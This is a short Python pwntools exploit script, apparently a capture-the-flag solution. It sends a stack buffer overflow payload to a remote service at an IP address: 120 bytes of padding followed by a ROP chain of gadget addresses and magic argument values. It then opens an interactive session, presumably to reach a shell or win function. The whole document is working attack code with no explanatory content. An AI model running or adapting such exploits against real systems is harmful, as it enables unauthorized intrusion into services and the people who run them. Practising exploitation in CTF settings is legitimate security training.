from pwn import *

elf = context.binary = ELF("./chall")
context.log_level='debug'

# p = process()
p = remote("103.185.44.122", 19001)

payload = b'a'*120
payload += p64(0x000000000040101a)
payload += p64(0x000000000040121e)
payload += p64(0xDEADBEEFDEADBEEF)
payload += p64(0x0000000000401220)
payload += p64(0xABCD1234DCBA4321)
payload += p64(0x0000000000401222)
payload += p64(0x147147147147147)
payload += p64(0x0000000000401227)

p.sendline(payload)
p.interactive()